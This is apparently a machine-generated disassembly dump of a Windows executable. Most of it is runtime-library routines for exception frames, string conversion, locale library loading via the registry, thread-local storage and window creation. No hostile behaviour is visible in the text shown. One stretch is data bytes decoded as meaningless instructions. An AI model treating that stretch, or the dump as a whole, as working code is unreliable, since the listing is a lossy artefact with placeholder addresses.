xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404c68
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b3c
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4048f4
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b3c
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404c50
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404c70
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404e08
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4048f4
sub_404e44
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404e08
pop edx
pop eax
sub_404e6c
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404e9c
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_4050d8
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404ee4
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404e9c
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_404f20
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_404f0c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_404f0c
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_404f0c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4050d8
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4051dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_404f20
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405378
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_4053d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405413
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405444
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4054a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4053d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4054af
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4054cc
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4054f8
test edx edx
je sub_4054b4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_40559c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4055c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4056a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4057d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405877
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e78
mov eax ebx
xor edx edx
call sub_4046d0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40587e
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
call sub_4046c4
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4044c4
mov eax ebx
call sub_4046c4
push eax
mov eax [ ebp - 0x4 ]
call sub_404138
inc eax
push eax
mov eax ebx
call sub_4046b4
push eax
mov eax [ ebp - 0x4 ]
call sub_404338
pop ecx
pop edx
call sub_4055c4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e78
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044c4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ecc
sub_405884
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40591b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404558
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405922
lea eax [ ebp - 0x4 ]
call sub_404558
retn
mov eax ebx
call sub_404138
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4047a0
mov eax ebx
call sub_404138
push eax
mov eax [ ebp - 0x4 ]
call sub_4046c4
inc eax
push eax
mov eax ebx
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
call sub_4046b4
pop ecx
pop edx
call sub_4056a0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404558
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4047a0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404594
sub_405928
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40596b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4046a4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4057d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405972
lea eax [ ebp - 0x4 ]
call sub_404558
retn
sub_405978
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404070
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404ee4
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_403f68
jmp r-xdata
sub_4059d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405a36
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4040e8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b5c
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a3d
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
xor ebx ebx
sub_405a44
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405a8e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a95
retn
mov eax rw-data
call sub_402998
mov eax rw-data
call sub_402998
mov eax rw-data
call sub_402998
call sub_401ac0
sub_405a98
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404c14
call sub_402f68
test al al
je r-xdata
call sub_40305c
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402f98
call sub_40127c
call sub_4059d0
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_4059d0
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405ba0
push ebx
call sub_405b98
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405b8c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403e6c
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403e6c
sub_405be4
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405ba0
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405c30
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405b6c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405c24
mov edx rw-data
mov eax ebx
call sub_403bc0
pop ebx
retn
sub_405c74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405c99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ca0
retn
sub_405cd0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405cec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d18
retn
sub_405d36
call [ eax + r-xdata ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
cmp [ ebp + 0x40 ] bl
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
rol [ esi ] cl
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc esi
add [ ebx + 0x2c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
and al 0xd3
inc esi
add [ ebx + 0x2025ffc0 ] cl
rol [ esi ] cl
mov eax eax
jmp [ EnumCalendarInfoA@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esi
add [ ebx + 0x1825ffc0 ] cl
rol [ esi ] cl
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x3425ffc0 ] cl
rol [ esi ] cl
mov eax eax
jmp [ __import_lookup_table_6(kernel32:CreateEventA) ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
in al dx
pop ebp
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x2825ffc0 ] cl
rol [ esi ] cl
mov eax eax
jmp [ DeleteCriticalSection@IAT ]
mov eax eax
jmp [ FormatMessageA@IAT ]
add edi [ eax ]
pop ebp
inc eax
add [ ebx + 0x3025ffc0 ] cl
rol [ esi ] cl
mov eax eax
jmp [ RegOpenKeyExA@IAT ]
sub_4068b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402914
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402904
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_40690c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402914
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402904
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406964
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
